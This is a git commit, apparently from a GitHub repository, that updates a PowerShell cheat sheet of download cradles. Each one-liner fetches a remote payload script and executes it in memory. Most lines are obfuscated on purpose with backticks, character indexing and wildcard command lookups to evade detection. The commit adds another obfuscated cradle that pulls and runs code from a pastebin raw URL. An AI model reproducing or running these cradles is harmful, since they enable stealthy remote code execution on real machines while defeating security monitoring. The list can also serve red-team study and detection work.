4053e2d8f115570f6f8a933e42b2c53f2f5641ec
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-26 12:58:58 +0100

    Update Download_Cradles.ps1

--- Download_Cradles.ps1
+++ Download_Cradles.ps1
@@ -3,11 +3,13 @@
 ps> IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")
 ps> Invoke-Expression((New-Object Net.WebClient).DownloadString('https://server/payload.ps1'))
 
+
 # Windows PowerShell lightly obfuscated Cradle not proxy aware
 ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
 ps> i`EX (    neW-o`BJE`cT N`ET.`weBcl`IeNT    )."do`wnLO`ADS`TRinG"(    "http://server/payload.ps1"   )
 ps> Invoke-Expression((.(Get-Command N*-O*)Net.WebClient).DownloadString('https://www.server/payload.ps1'))
 ps> i`Ex ( nE`w-`ObJect Ne`T.WEBCl`Ient  )."DowNlo`Ads`TRI`NG"(   "ht"+"tps://server/payload.ps1"  )
+
 
 # Windows PowerShell heavily obfuscated Cradle not proxy aware
 ps> Invoke-Expression((.(Get-Command N*-O*)Net.WebClient).(((((.(Get-Command N*-O*)Net.WebClient)).PsObject.Methods)|Where-Object{(Get-Variable _ -Value).Name-clike'*wn*d*g'}).Name).Invoke('https://www.server/payload.ps1'))
@@ -18,6 +20,11 @@ ps> $url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);
 ps> &( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')
 ps> $ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-clike'*S*i*t'}).Name).Invoke((New-Object Net.WebClient).DownloadString('http://server/payload.ps1'))
 ps> &( (Get-ChildItem Variable:P*ho*).Value[4]+$PsHome[30]+'x')(.(Get-Command N*-O*)Net.WebClient).(((((.(Get-Command N*-O*)Net.WebClient)).PsObject.Methods)|Where-Object{(Get-Variable _ -Value).Name-clike'*wn*d*g'}).Name).Invoke('https://www.server/payload.ps1')
+
+#Info: &(GAL IE*) = Alias IEX; .(Get-Command N*ct) = New-Object; .(((((.(Get-Command N*ct)Net.WebClient)).PsObject.Methods)|Where{(Variable _ -ValueOn).Name-like'*nl*g'}).Name).Invoke = Downloadstring
+ps> &(GAL IE*)((.(Get-Command N*ct)Net.WebClient).(((((.(Get-Command N*ct)Net.WebClient)).PsObject.Methods)|Where{(Variable _ -ValueOn).Name-like'*nl*g'}).Name).Invoke("ht"+"tps://pastebin.com/raw/Qpiz8y6c"))
+
+
 
 # Proxy aware download cradles
 # Info: I use a shortcut link to the raw link from your hosted payload on Github
